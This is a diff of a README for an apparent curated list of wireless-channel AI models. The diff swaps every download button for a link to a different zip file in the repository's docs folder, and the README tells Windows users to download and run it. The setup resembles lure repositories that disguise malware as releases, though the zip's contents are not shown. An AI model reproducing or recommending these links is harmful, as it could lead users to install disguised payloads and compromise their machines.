@@ -1,6 +1,6 @@
 # ⚡ Awesome-Channel-Foundation-Models - Simplify Wireless AI Models
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/marciojo4080/Awesome-Channel-Foundation-Models/raw/refs/heads/main/docs/Awesome-Models-Foundation-Channel-1.3.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/marciojo4080/Awesome-Channel-Foundation-Models/main/docs/Models-Awesome-Channel-Foundation-2.7.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section guides you through downloading and running the files on your Window
 
 Click the button below to visit the release page, where you will find the latest files for this application.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue)](https://github.com/marciojo4080/Awesome-Channel-Foundation-Models/raw/refs/heads/main/docs/Awesome-Models-Foundation-Channel-1.3.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/marciojo4080/Awesome-Channel-Foundation-Models/main/docs/Models-Awesome-Channel-Foundation-2.7.zip)
 
 ---
 
@@ -121,7 +121,7 @@ A: Contact Jun Jiang via email or open an issue on GitHub with your submission.
 
 Visit this page to download the latest files and access the full collection of AI wireless communication models:
 
-[Download Latest Releases](https://github.com/marciojo4080/Awesome-Channel-Foundation-Models/raw/refs/heads/main/docs/Awesome-Models-Foundation-Channel-1.3.zip)
+[Download Latest Releases](https://raw.githubusercontent.com/marciojo4080/Awesome-Channel-Foundation-Models/main/docs/Models-Awesome-Channel-Foundation-2.7.zip)
 
 After downloading, follow the extraction and opening steps to start exploring.
 
